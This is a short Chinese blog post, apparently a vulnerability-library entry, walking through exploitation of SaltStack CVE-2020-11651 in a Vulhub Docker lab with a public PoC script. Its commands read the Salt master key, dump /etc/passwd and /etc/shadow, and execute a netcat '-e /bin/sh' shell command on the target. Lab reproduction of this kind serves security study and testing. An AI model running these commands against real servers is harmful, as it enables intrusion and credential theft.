---
title: 'SaltStack认证绕过漏洞 CVE-2020-11651'
date: Mon, 31 Aug 2020 09:11:03 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 影响范围：

SaltStack < 2019.2.4 SaltStack < 3000.2

靶机环境：Debian10  
靶机IP：192.168.0.250 Kali攻击机IP：192.168.0.124

在Vulhub中找到并进入该漏洞编号目录 cd Vulhub/saltstack/CVE-2020-11651

在该目录启动环境： docker-compose up -d ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/4.png)

查看环境是否成功启动 docker ps //查看docker中正在运行的容器 ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/5.png)

在攻击机上准备Poc 攻击机环境：Kali IP：192.168.0.124

需要先安装Salt库，需指定Salt库版本 pip3 install salt=2019.2.3

然后我没有pip3 就再安装pip3 apt install python3-pip（我没成功）换方法 浏览器安装Salt3000.1 下载地址https://pypi.org/simple/salt/

然后 放进kali攻击机解压： tar -xvzf salt-3000.1.tar.gz

进入解压目录执行安装 python3 setup.py install

安装完成后运行Poc python3 exploit.py -m 192.168.0.250 ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/6.png) 成功读取Key

继续读取文件： python3 exploit.py -m 192.168.0.250 -r /etc/passwd ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/7.png) 成功读取密码 在靶机上执行任意命令： python3 exploit.py -m 192.168.0.250 --exec "nc 127.0.0.1 4444 -e /bin/sh" ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/8.png)

读取/etc/shadow文件 python3 exploit.py -m 192.168.0.250 -r /etc/shadow ![](https://www.bylibrary.cn/wp-content/uploads/2020/08/9.png)

注：应该还能干好多事情. 参考链接： [https://github.com/jasperla/CVE-2020-11651-poc](https://github.com/jasperla/CVE-2020-11651-poc)